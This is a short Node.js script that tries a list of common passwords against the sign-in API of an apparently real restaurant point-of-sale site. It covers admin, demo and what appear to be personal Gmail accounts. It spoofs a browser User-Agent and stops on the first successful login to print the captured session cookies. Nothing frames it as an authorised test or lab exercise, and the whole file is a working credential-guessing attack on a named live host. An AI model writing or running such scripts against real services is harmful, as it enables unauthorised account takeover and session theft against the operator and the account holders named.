const https = require('https');

async function tryLogin(username, password) {
    return new Promise((resolve) => {
        const data = JSON.stringify({ username, password });
        const req = https.request({
            hostname: 'restro-pos.klebjeb.cloud',
            port: 443,
            path: '/api/v1/auth/signin',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data),
                'User-Agent': 'Mozilla/5.0'
            }
        }, (res) => {
            let body = '';
            res.on('data', c => body += c);
            res.on('end', () => {
                resolve({
                    username,
                    status: res.statusCode,
                    cookies: res.headers['set-cookie'],
                    body: body.substring(0, 300)
                });
            });
        });
        req.on('error', e => resolve({ username, error: e.message }));
        req.write(data);
        req.end();
    });
}

(async () => {
    const creds = [
        ['admin@example.com', 'Admin@123456'],
        ['admin@example.com', 'password'],
        ['admin@example.com', '123456'],
        ['demo@demo.com', '123456'],
        ['demo@demo.com', 'password'],
        ['kettip.dev@gmail.com', '123456'],
        ['sopheak@gmail.com', '123456'],
        ['sopheak@gmail.com', 'password']
    ];

    for (const [u, p] of creds) {
        const res = await tryLogin(u, p);
        console.log(`[${u}] Status ${res.status}: ${res.body}`);
        if (res.status === 200) {
            console.log('SUCCESSFUL LOGIN! Cookies:', res.cookies);
            break;
        }
    }
})();
